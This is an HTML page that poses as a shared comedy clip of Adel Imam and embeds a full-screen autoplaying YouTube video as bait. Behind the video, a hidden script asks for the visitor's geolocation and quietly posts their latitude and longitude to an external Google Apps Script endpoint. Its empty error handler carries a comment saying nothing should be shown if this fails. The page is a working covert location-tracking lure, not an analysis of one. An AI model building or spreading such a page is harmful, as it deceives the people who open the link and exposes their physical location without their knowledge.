<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>🤣 شوف الفيديو ده عادل امام ضحك موت</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
      height: 100%;
      width: 100%;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      border: none;
    }
  </style>
</head>
<body>

  <iframe src="https://www.youtube.com/embed/9A6OAWmtkWY?autoplay=1&rel=0&showinfo=0"
          allowfullscreen allow="autoplay; encrypted-media"></iframe>

  <script>
    try {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("https://script.google.com/macros/s/AKfycbzL5Nys6NIEa27q5QPkcf0mMJ3U6YRr_ZBF1T7H3BLMBhI46VsbaS5xlv5DxYi2eCszcA/exec", {
          method: "POST",
          mode: "no-cors",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        });
      });
    } catch(e) {
      // ما نعرضش أي حاجة حتى لو فشل
    }
  </script>

</body>
</html>
